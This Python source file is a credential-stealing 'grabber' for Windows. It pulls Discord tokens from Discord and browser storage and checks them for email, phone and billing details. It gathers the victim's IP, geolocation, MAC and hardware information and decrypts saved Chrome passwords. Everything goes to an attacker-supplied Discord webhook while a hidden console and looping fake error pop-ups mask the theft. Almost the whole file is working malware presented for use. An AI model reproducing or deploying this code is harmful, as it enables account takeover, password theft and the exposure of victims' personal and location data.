import os, psutil, platform, socket, requests,PySimpleGUI as sg, json, base64, win32crypt, shutil, sqlite3, ctypes
from pynput.keyboard import Key #add keylogger
from Crypto.Cipher import AES
from urllib.request import Request, urlopen
from datetime import date
from requests import get
from re import findall
from json import loads, dumps
from base64 import b64decode
from urllib.request import Request, urlopen
from uuid import getnode as get_mac
web_fucking_hook = "put ur shitty little webhook here"

def fucker():
    ctypes.windll.user32.ShowWindow( ctypes.windll.kernel32.GetConsoleWindow(), 0 ) #hides window
    while True:
        try:
            sg.Popup("Python Error",'Oops Error: Please Restart the file')
        except:
            pass
    # ^ pop up spammer
today = date.today()
sendALLtkns = True # Put True if you want all the tokens on the pc to send.
LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
PATHS = {
    "Discord"           : ROAMING + "\\Discord",
    "Discord Canary"    : ROAMING + "\\discordcanary",
    "Discord PTB"       : ROAMING + "\\discordptb",
    "Google Chrome"     : LOCAL + "\\Google\\Chrome\\User Data\\Default",
    "Opera"             : ROAMING + "\\Opera Software\\Opera Stable",
    "Brave"             : LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
    "Yandex"            : LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
}

def get_master_key():
    with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State', "r", encoding='utf-8') as f:
        local_state = f.read()
        local_state = json.loads(local_state)
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]
    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
    return master_key
    

def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = generate_cipher(master_key, iv)
        decrypted_pass = decrypt_payload(cipher, payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass
    except Exception as e:
        return "Chrome < 80"

def getheaders(token=None, content_type="application/json"):
    headers = {
        "Content-Type": content_type,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
    }
    if token:
        headers.update({"Authorization": token})
    return headers

def getuserdata(token):
    try:
        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getheaders(token))).read().decode())
    except:
        pass

def gettokens(path):
    path += "\\Local Storage\\leveldb"
    tokens = []
    for file_name in os.listdir(path):
        if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
            continue
        for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                for token in findall(regex, line):
                    tokens.append(token)
    return tokens

def getavatar(uid, aid):
    url = f"https://cdn.discordapp.com/avatars/{uid}/{aid}.gif"
    try:
        urlopen(Request(url))
    except:
        url = url[:-4]
    return url

def getchat(token, uid):
    try:
        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/channels", headers=getheaders(token), data=dumps({"recipient_id": uid}).encode())).read().decode())["id"]
    except:
        pass

def has_payment_methods(token):
    try:
        return bool(len(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=getheaders(token))).read().decode())) > 0)
    except:
        pass

def scale(bytes, suffix="B"):
    defined = 1024
    for unit in ["", "K", "M", "G", "T", "P"]:
        if bytes < defined:
            return f"{bytes:.2f}{unit}{suffix}"
        bytes /= defined


my = platform.uname()
host = os.getenv('username')
host2 = socket.gethostname()
localip = socket.gethostbyname(host2)
ip = get('https://api.ipify.org').text
city = get(f'https://ipapi.co/{ip}/city').text
region = get(f'https://ipapi.co/{ip}/region').text
postal = get(f'https://ipapi.co/{ip}/postal').text
timezone = get(f'https://ipapi.co/{ip}/timezone').text
currency = get(f'https://ipapi.co/{ip}/currency').text
country = get(f'https://ipapi.co/{ip}/country_name').text
vpn = requests.get('http://ip-api.com/json?fields=proxy')
proxy = vpn.json()['proxy']
mac = get_mac()
cpufreq = psutil.cpu_freq()
svmem = psutil.virtual_memory()
partitions = psutil.disk_partitions()
disk_io = psutil.disk_io_counters()
net_io = psutil.net_io_counters()
partitions = psutil.disk_partitions()
for partition in partitions:
    try:
        partition_usage = psutil.disk_usage(partition.mountpoint)
    except PermissionError:
        continue

def tkngrab():
    embeds = []
    working = []
    checked = []
    working_ids = []
    message = ''
    if sendALLtkns == True:
        for platform, path in PATHS.items():
            if not os.path.exists(path):
                continue

            message += f'**__{platform} Tokens:__**\n'

            tokens = gettokens(path)

            if len(tokens) > 0:
                for token in tokens:
                    message += f'{token}\n'
            else:
                message += 'No tokens found.\n'

    for host, path in PATHS.items():
        if not os.path.exists(path):
            continue
        for token in gettokens(path):
            if token in checked:
                continue
            checked.append(token)
            uid = None
            if not token.startswith("mfa."):
                try:
                    uid = b64decode(token.split(".")[0].encode()).decode()
                except:
                    pass
                if not uid or uid in working_ids:
                    continue
            user_data = getuserdata(token)
            if not user_data:
                continue
            working_ids.append(uid)
            working.append(token)
            username = user_data["username"] + "#" + str(user_data["discriminator"])
            user_id = user_data["id"]
            avatar_id = user_data["avatar"]
            avatar_url = getavatar(user_id, avatar_id)
            email = user_data.get("email")
            phone = user_data.get("phone")
            nitro = bool(user_data.get("premium_type"))
            billing = bool(has_payment_methods(token))
            embed = {
                "description": f"{message}",
                "color": 0,
                "fields": [
                    {
                        "name": "**__Account Information__**",
                        "value": f'Email: **{email}**\nPhone: **{phone}**\nNitro: **{nitro}**\nBilling Info: **{billing}**',
                        "inline": True
                    },
                    {
                        "name": "**__PC Information__**",
                        "value": f'Pc Name: **{host}**\nPc System: **{my.system}**\nTotal Size: **{scale(partition_usage.total)}**\nUsed: **{scale(partition_usage.used)}**\nFree: **{scale(partition_usage.free)}**\nPercentage: **{partition_usage.percent}**%\nTotal read: **{scale(disk_io.read_bytes)}**\nTotal write: **{scale(disk_io.write_bytes)}**',
                        "inline": True
                    },
                    {
                        "name": "**__User IP Info__**",
                        "value": f'Is A Vpn: **{proxy}** | Not Always Valid\nLocal IP: **{localip}**\nPublic IP: **{ip}**\nMac Address: **{mac}**\nCountry: **{country}**\nRegion: **{region}**\nCity: **{city}**',
                        "inline": True
                    },
                    {
                        "name": "**__CPU Information__**",
                        "value": f"Psychical cores: **{psutil.cpu_count(logical=False)}**\nTotal Cores: **{psutil.cpu_count(logical=True)}**\nMax Speed: **{cpufreq.max:.2f}** Mhz\nMin Speed: **{cpufreq.min:.2f}** Mhz\nTotal CPU usage: {psutil.cpu_percent()}",
                        "inline": True
                    },
                    {
                        "name": "**Token**",
                        "value": f"Token Found: {token}",
                        "inline": False
                    },
                ],
                "author": {
                    "name": f"{username} | ID:{user_id} | PC: {host}",
                    "icon_url": avatar_url
                },
                "footer": {
                    "text": f"Grabber Powered By ur mums bunda",
                    "icon_url": "https://cdn.discordapp.com/avatars/804066223741730836/a_3507e13bbebcf4f57a991f24632a1821.webp?size=128"
                },
                    
            }
            embeds.append(embed)
    webhook = {
        "content": "",
        "embeds": embeds,
        "username": "Powered By ur mums bunda",
        "avatar_url": "https://cdn.discordapp.com/avatars/804066223741730836/a_3507e13bbebcf4f57a991f24632a1821.webp?size=128"
    }
    try:
        urlopen(Request(web_fucking_hook, data=dumps(webhook).encode(), headers=getheaders()))
    except:
        pass

def grabpw():
    embeds = []
    master_key = get_master_key()
    login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\default\Login Data'
    shutil.copy2(login_db, "Loginvault.db")
    conn = sqlite3.connect("Loginvault.db")
    cursor = conn.cursor()
    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
    for r in cursor.fetchall():
        url = r[0]
        username = r[1]
        encrypted_password = r[2]
        password = decrypt_password(encrypted_password, master_key)
        embed = {
            "color": 0,
            "fields": [
                {
                    "name": f"**__{host}'s Info__**",
                    "value": f'\nUrl: {url}\nUsername: {username}\nPassword: {password}',
                    "inline": True
                },
            ],
            "author": {
                "name": f"PC: {host}",
                "icon_url": "https://cdn.discordapp.com/avatars/804066223741730836/a_3507e13bbebcf4f57a991f24632a1821.webp?size=128"
            },
            "footer": {
                "text": f"Grabber Powered By ur mums bunda",
                "icon_url": "https://cdn.discordapp.com/avatars/804066223741730836/a_3507e13bbebcf4f57a991f24632a1821.webp?size=128"
            },
                    
        }
        embeds.append(embed)
    webhook = {
        "content": "",
        "embeds": embed,
        "username": "Powered By ur mums bunda",
        "avatar_url": "https://cdn.discordapp.com/avatars/804066223741730836/a_3507e13bbebcf4f57a991f24632a1821.webp?size=128"
    }
    cursor.close()
    conn.close()
    try:
        os.remove("Loginvault.db")
        urlopen(Request(web_fucking_hook, data=dumps(webhook).encode(), headers=getheaders()))
    except Exception as e:
        pass

if __name__ == '__main__':
    tkngrab()
    fucker()
    #grabpw()
